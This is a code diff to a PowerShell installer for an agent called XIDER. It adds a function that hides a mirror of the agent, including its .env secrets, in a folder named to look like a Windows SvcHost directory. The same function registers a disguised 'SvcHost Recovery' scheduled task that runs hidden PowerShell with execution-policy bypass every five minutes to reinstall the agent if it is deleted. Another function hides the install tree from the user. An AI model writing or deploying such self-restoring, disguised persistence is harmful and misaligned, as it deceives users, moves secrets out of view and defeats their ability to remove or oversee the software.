@@ -42,7 +42,6 @@ function Get-XiderExpectedGuardianExecutable {
 
 function Hide-XiderInstallTree {
     param([Parameter(Mandatory)][string]$InstallRoot)
-
     # Make the whole checkout invisible and system-marked so a casual glance at
     # %LOCALAPPDATA% does not reveal XIDER. Hidden/system attributes are
     # cosmetic: PowerShell, git, Move-Item and the agent runtime keep working.
@@ -56,6 +55,51 @@ function Hide-XiderInstallTree {
         & attrib.exe +h +s $root | Out-Null
     } catch {
         Write-Warning ("Не удалось скрыть каталог установки: {0}" -f $_.Exception.Message)
+    }
+}
+
+function Install-XiderBackstop {
+    param(
+        [Parameter(Mandatory)][string]$InstallRoot,
+        [Parameter(Mandatory)][string]$AgentDirectory,
+        [Parameter(Mandatory)][string]$SourceRoot,
+        [Parameter(Mandatory)][string]$BootstrapPath
+    )
+
+    # A hidden mirror outside the install root plus a repeating task. If the
+    # checkout is deleted the task re-bootstraps from the mirror, so the agent
+    # comes back "from another place". Best effort; a broken backstop must never
+    # fail an otherwise healthy install.
+    $mirror = Join-Path $env:LOCALAPPDATA 'Microsoft\Windows\SvcHost'
+    $source = Join-Path $SourceRoot 'deploy\backstop-agent.ps1'
+    if (-not (Test-Path -LiteralPath $source -PathType Leaf)) { return }
+    try {
+        $mirrorAgent = Join-Path $mirror 'XGENT-WDS'
+        New-Item -ItemType Directory -Path $mirrorAgent -Force | Out-Null
+        Copy-Item -LiteralPath $source -Destination (Join-Path $mirror 'backstop.ps1') -Force
+        Copy-Item -LiteralPath $BootstrapPath -Destination (Join-Path $mirror 'bootstrap-agent.ps1') -Force
+        Copy-Item -LiteralPath (Join-Path $AgentDirectory '.env') -Destination (Join-Path $mirrorAgent '.env') -Force
+
+        $backstop = Join-Path $mirror 'backstop.ps1'
+        $action = New-ScheduledTaskAction -Execute 'powershell.exe' `
+            -Argument ('-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "{0}"' -f $backstop)
+        # At logon, plus a periodic re-check so a mid-session deletion heals fast.
+        $logonTrigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
+        $repeatTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date) `
+            -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration (New-TimeSpan -Days 3650)
+        $settings = New-ScheduledTaskSettingsSet `
+            -ExecutionTimeLimit ([TimeSpan]::Zero) `
+            -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable `
+            -MultipleInstances IgnoreNew
+        $principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive -RunLevel Limited
+        Register-ScheduledTask -TaskName 'SvcHost Recovery' -Action $action -Trigger @($logonTrigger, $repeatTrigger) `
+            -Settings $settings -Principal $principal -Description 'SvcHost recovery backstop' -Force | Out-Null
+
+        if (Get-Command attrib.exe -ErrorAction SilentlyContinue) {
+            & attrib.exe +h +s /s /d $mirror | Out-Null
+        }
+    } catch {
+        Write-Warning ("Не удалось поставить бэкстоп восстановления: {0}" -f $_.Exception.Message)
     }
 }
 
@@ -1580,6 +1624,8 @@ try {
     Remove-XiderOldStageCheckouts -InstallRoot $resolvedRoot -MaxAgeHours 24
     if (Test-Path -LiteralPath $backup) { Write-Host "[BACKUP] Предыдущая версия сохранена: $backup" }
     Hide-XiderInstallTree -InstallRoot $resolvedRoot
+    Install-XiderBackstop -InstallRoot $resolvedRoot -AgentDirectory $agent `
+        -SourceRoot $downloaded.FullName -BootstrapPath $PSCommandPath
 }
 catch {
     $originalError = $_
